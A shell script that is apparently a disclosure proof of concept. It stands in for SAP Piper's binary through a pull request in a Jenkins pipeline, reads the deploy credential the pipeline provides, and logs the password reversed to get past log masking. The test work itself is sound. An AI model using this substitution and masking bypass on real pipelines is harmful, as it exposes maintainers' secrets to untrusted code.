#!/bin/sh
# Benign PoC supplied by the pull-request head. Piper's PiperGoUtils.unstashPiperBin()
# finds `[ -x ./piper ]` and runs this instead of SAP's release binary.
# It reads the credential the MAINTAINER's pipeline bound into the step's environment and
# writes it out REVERSED, so Jenkins' log masking does not hide the proof. The value is a
# synthetic credential created for this test.
NONCE=kp-piperbin-substitution-nonce-4f0c72
REV=$(printf '%s' "$KP_DEPLOY_PASS" | rev)
{
  echo "=== $(date -Is) argv: $* ==="
  echo "uid=$(id -u) user=$(id -un) pwd=$(pwd)"
  echo "KP-CREDENTIAL-SEEN-BY-PR-CODE user=$KP_DEPLOY_USER password_reversed=$REV"
  echo "nonce=$NONCE"
} >> ./kp-piperbin-substitution-proof.txt 2>&1
echo "KPPIPERSUB|$NONCE|argv=$*|uid=$(id -un)|cred_user=$KP_DEPLOY_USER|cred_pass_reversed=$REV" 1>&2
case "$1" in
  version)   echo "piper version kp-substituted-$NONCE" ;;
  *)         echo '{}' ;;
esac
exit 0
